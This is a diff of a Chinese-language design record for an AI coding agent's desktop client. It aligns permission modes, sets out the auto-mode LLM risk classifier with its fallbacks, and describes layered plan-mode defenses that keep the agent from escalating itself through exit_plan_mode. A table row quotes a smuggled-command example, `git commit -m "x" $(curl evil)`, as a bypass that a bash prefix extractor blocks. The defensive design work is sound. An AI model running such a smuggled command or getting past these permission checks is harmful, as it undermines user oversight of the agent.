@@ -14,15 +14,15 @@
 KodaX Space alpha.0 / alpha.1 阶段，desktop 端的 `permissionMode` enum 是脑补的 4 档：
 
 ```ts
-'plan-mode' | 'accept-edits' | 'ask-permissions' | 'bypass-permissions'
+'plan-mode' | 'accept-edits' | 'ask-permissions' | 'bypass-permissions';
 ```
 
 2026-05-18 review KodaX REPL 源码后发现：**KodaX TUI 的 canonical 设计是 3 mode + auto 子档**（FEATURE_092, v0.7.33 起）：
 
 ```ts
-export type PermissionMode = "plan" | "accept-edits" | "auto" | "auto-in-project";
+export type PermissionMode = 'plan' | 'accept-edits' | 'auto' | 'auto-in-project';
 //                                                              ↑ 0.7.38 移除的 deprecated alias
-export type AutoModeEngine = "llm" | "rules";
+export type AutoModeEngine = 'llm' | 'rules';
 ```
 
 Desktop 4 mode 与 TUI 3 mode 完全错位——会引发以下问题：
@@ -53,20 +53,24 @@ export const permissionModeSchema = z.enum(['plan', 'accept-edits', 'auto']);
 export const autoModeEngineSchema = z.enum(['llm', 'rules']);
 ```
 
-- **`engine: 'llm'`**：sideQuery 跑 classifier，LLM 自己判断 risk
+- **`engine: 'llm'`**：sideQuery 跑 classifier；合法 `decision=allow|ask` 是该调用的最终权限决策，静态 signals 只提供事实
 - **`engine: 'rules'`**：走 `~/.kodax/auto-rules.jsonc` + 内置 signals (file/bash/path) + AGENTS.md 上下文
-- **自动 fallback**：触达 denial threshold (3/20 连续 deny) 或 circuit breaker (5 次错误 in 10 分钟) → llm 自动降级到 rules，UI 反映新状态
+- **基础设施 fallback**：classifier 重试后仍失败时仅对当前调用采用 Accept-edits 边界；`engine` 保持 `llm`，不会静默改成 Rules
 - **手动切换**：用户可在 ModeSelector 子菜单 / `/auto-engine` slash command 显式翻回 llm
 
 ### 3. AutoModeToolGuardrail 注入
 
 `RealKodaXSession` 在 `mode === 'auto'` 时调 `bootstrapAutoMode`（来自 `@kodax-ai/coding`），把返回的 `AutoModeToolGuardrail` 通过 `KodaXOptions.guardrails` 数组注入 KodaX runtime。
 
+KodaX 在 `events.beforeToolExecute` 之前执行 ToolGuardrail。只要本轮 bootstrap 成功，guardrail
+就是该调用的唯一权限决策者；Space 的事件钩子保留 Partner 白名单，但不再把已允许的调用交给
+本地 `PermissionBroker` 二次复审。Bootstrap 失败时才恢复 broker fallback，避免 fail open。
+
 ```ts
 // apps/desktop/electron/kodax/real-session.ts (新增逻辑)
 if (this.permissionMode === 'auto') {
   const { getGuardrail } = await bootstrapAutoMode({
-    askUser: this.askUserBridge,        // wire to Space PermissionBroker
+    askUser: this.askUserBridge, // wire to Space AskUser UI
     projectRoot: this.projectRoot,
     getAgentsFiles: () => loadAgentsMd(this.projectRoot),
     getCurrentProviderName: () => this.provider,
@@ -130,24 +134,24 @@ KodaX 的 `auto-in-project` alias 是 0.7.32 → 0.7.33 升级遗留，0.7.38 �
 
 Plan-mode 的"硬"语义靠多层防御：
 
-| 层 | 实现 | 命中时机 |
-|---|------|---------|
-| Layer 1: planModeBlockCheck | `KodaXOptions.context.planModeBlockCheck` | LLM 决定要调 tool 时（KodaX 自己防御）|
-| Layer 2: beforeToolExecute | Space `PermissionBroker.request(mode='plan')` 短路 deny | 工具实际执行前 |
-| Layer 3: exitPlanMode reject | desktop 永远 return false，emit `thinking_end` 推 plan 给用户 | LLM 调用 `exit_plan_mode` tool 时 |
-| Layer 4: Bash prefix extractor | KodaX FEATURE_153 防 `git commit -m "x" $(curl evil)` 绕过 | bash 命令分类时 |
+| 层                             | 实现                                                          | 命中时机                               |
+| ------------------------------ | ------------------------------------------------------------- | -------------------------------------- |
+| Layer 1: planModeBlockCheck    | `KodaXOptions.context.planModeBlockCheck`                     | LLM 决定要调 tool 时（KodaX 自己防御） |
+| Layer 2: beforeToolExecute     | Space `PermissionBroker.request(mode='plan')` 短路 deny       | 工具实际执行前                         |
+| Layer 3: exitPlanMode reject   | desktop 永远 return false，emit `thinking_end` 推 plan 给用户 | LLM 调用 `exit_plan_mode` tool 时      |
+| Layer 4: Bash prefix extractor | KodaX FEATURE_153 防 `git commit -m "x" $(curl evil)` 绕过    | bash 命令分类时                        |
 
 Layer 1+2 双闸：即便 KodaX 内部 planModeBlockCheck 有遗漏，Space broker 在 beforeToolExecute 二次校验仍 deny。Layer 3 防 LLM 通过 `exit_plan_mode` 把自己升级——KodaX TUI 的 exit_plan_mode 有人在 loop（弹 confirm dialog），Desktop 在 askUser modal（FEATURE_033）就位前暂时硬 reject。
 
 ## Alternatives Rejected
 
-| 方案 | 否决理由 |
-|------|---------|
-| 保留 4 mode + 新增 auto 作为第 5 档 | 留 ask-permissions / bypass-permissions = 语义重复 + 用户疑惑 + 持续维护成本 |
-| 只对齐 mode 名（plan/accept-edits/auto），不接 AutoModeToolGuardrail | auto 没 guardrail = 等于 bypass-permissions 改名；失去 KodaX 全部安全网 |
-| 在 alpha.2 / v0.1.1 才改 | 拖越久 breaking 影响越大；用户已点名要求对齐 |
-| 自定义 auto mode 实现（不复用 KodaX guardrail） | 重新造 denial tracker + circuit breaker + classifier prompt + signal collectors 是数月工作量，且不保证与 TUI 行为一致 |
-| 把 `ask-permissions` 改名为 "interactive"，作为第 4 档 | KodaX 没此概念；保留 = 跨界面分歧 |
+| 方案                                                                 | 否决理由                                                                                                              |
+| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
+| 保留 4 mode + 新增 auto 作为第 5 档                                  | 留 ask-permissions / bypass-permissions = 语义重复 + 用户疑惑 + 持续维护成本                                          |
+| 只对齐 mode 名（plan/accept-edits/auto），不接 AutoModeToolGuardrail | auto 没 guardrail = 等于 bypass-permissions 改名；失去 KodaX 全部安全网                                               |
+| 在 alpha.2 / v0.1.1 才改                                             | 拖越久 breaking 影响越大；用户已点名要求对齐                                                                          |
+| 自定义 auto mode 实现（不复用 KodaX guardrail）                      | 重新造 denial tracker + circuit breaker + classifier prompt + signal collectors 是数月工作量，且不保证与 TUI 行为一致 |
+| 把 `ask-permissions` 改名为 "interactive"，作为第 4 档               | KodaX 没此概念；保留 = 跨界面分歧                                                                                     |
 
 ## Consequences
 
